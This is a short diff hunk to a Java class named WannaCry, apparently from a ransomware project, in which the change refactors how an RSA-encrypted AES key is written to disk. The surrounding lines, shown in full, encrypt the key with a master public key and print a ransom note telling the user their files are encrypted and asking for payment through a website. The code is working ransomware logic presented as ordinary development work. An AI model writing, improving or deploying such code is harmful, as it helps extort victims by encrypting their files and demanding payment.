@@ -45,10 +45,10 @@ public class WannaCry {
         rsaCipher.init(Cipher.ENCRYPT_MODE, masterPubKey);
         byte[] encryptedAesKey = rsaCipher.doFinal(aesKey.getEncoded());
 
-        FileOutputStream fos = new FileOutputStream("aes.key");
-        fos.write(encryptedAesKey);
-        fos.close();
-
+        try (FileOutputStream fos = new FileOutputStream("aes.key")) {
+            fos.write(encryptedAesKey);
+            fos.close();
+        }
         System.out.println("Dear User! Please note that your files have now been encrypted.");
         System.out.println("To recover your files we ask you to follow the instructions");
         System.out.println("in the website below to arrange a small payment:");
